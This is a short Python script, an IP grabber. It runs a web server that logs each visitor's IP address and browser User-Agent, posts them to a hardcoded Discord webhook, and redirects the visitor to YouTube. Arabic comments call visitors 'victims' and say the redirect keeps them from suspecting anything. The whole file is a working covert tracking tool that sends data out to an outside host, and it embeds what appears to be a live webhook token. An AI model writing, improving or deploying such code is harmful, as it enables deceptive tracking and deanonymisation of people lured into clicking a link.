import http.server
import urllib.parse
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/1559146894561779752/E1NTYMm_cVgNNekbxAUT7104FapcYWjx0IaoiEGXdUqUvEfwXlsFJAJ2iAeZ010Vlb-O"

class GrabberHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # تنسيق الرسالة لإرسالها للرابط #
        payload = f'{{"content": "🎯 **تم اصطياد ضحية جديدة!**\\n🌐 **IP:** {client_ip}\\n📱 **Device/Browser:** {user_agent}"}}'.encode('utf-8')
        
        req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
        try:
            urllib.request.urlopen(req)
        except:
            pass
            
        # يوتيووب أو ديسكورد عشان ما يشك الضحية #
        self.send_response(302)
        self.send_header('Location', 'https://www.youtube.com')
        self.end_headers()

if __name__ == '__main__':
    server = ('0.0.0.0', 10000)
    httpd = http.server.HTTPServer(server, GrabberHandler)
    httpd.serve_forever()
